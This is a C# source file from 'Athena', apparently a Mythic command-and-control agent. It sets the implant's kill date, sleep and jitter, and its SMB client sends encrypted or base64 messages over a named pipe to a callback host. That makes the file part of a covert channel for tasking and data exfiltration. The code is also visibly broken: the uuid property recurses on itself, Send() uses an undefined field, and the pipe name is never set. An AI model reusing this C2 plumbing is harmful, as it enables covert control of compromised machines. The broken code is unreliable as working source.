using Athena.Mythic.Model.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Pipes;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public SmbClient currentConfig { get; set; }
        public string uuid { 
            get { return uuid;  }
            set {
                //Custom Setter to update the SmbClient too
                this.uuid = value;
                this.currentConfig.uuid = value;
            } 
        }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SmbServer smbServer { get; set; }

        public MythicConfig()
        {
            this.uuid = "526cef59-f8a9-4473-a7e0-04e45a6de1f5";
            this.killDate = DateTime.Parse("2022-08-25");
            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new SmbClient(this.uuid);
            this.smbServer = new SmbServer();
        }
    }

    public class SmbClient
    {
        public string psk { get; set; }
        public string callbackHost { get; set; }
        public string pipeName { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        public NamedPipeClientStream pipeStream { get; set; }
        public PSKCrypto crypt { get; set; }
        public string uuid { get; set; }
        public bool encrypted { get; set; }

        public SmbClient(string uuid)
        {
            //this.callbackHost = "%SERVER%";
            //this.psk = "AESPSK";
            //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.callbackHost = "";
            this.psk = "";
            this.encryptedExchangeCheck = bool.Parse("False");
            this.uuid = uuid;
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }

            Connect(this.callbackHost, this.pipeName);
        }

        public bool Connect(string host, string pipename)
        {
            try
            {
                this.pipeStream = new NamedPipeClientStream
                    (this.callbackHost, this.pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);

                //Should I add a timeout for this?
                this.pipeStream.Connect();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public async Task<string> Send(object obj)
        {
            try
            {
                // Read user input and send that to the client process.
                using (BinaryWriter _bw = new BinaryWriter(pipeStream))
                using (BinaryReader _br = new BinaryReader(pipeStream))
                {

                    string json = JsonConvert.SerializeObject(obj);
                    if (this.encrypted)
                    {
                        json = this.crypt.Encrypt(json);
                    }
                    else
                    {
                        json = Misc.Base64Encode(this.mc.MythicConfig.uuid + json);
                    }
                    DelegateMessage msg = new DelegateMessage()
                    {
                        uuid = this.uuid,
                        message = json
                    };


                    var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
                    _bw.Write((uint)buf.Length);
                    _bw.Write(buf);

                    //Wait for response
                    var len = _br.ReadUInt32();
                    var temp = new string(_br.ReadChars((int)len));
                    
                    
                    Console.WriteLine("Received from client: {0}", temp);
                    if (this.encrypted)
                    {
                        return this.crypt.Decrypt(temp);
                    }
                    else
                    {
                        //Console.WriteLine(Misc.Base64Decode(m.Data).Substring(36));
                        return Misc.Base64Decode(temp).Substring(36);
                    }
                }
            }
            // Catch the IOException that is raised if the pipe is broken
            // or disconnected.
            catch (IOException e)
            {
                return "";
            }
            catch
            {
                return "";
            }
        }
    }
}
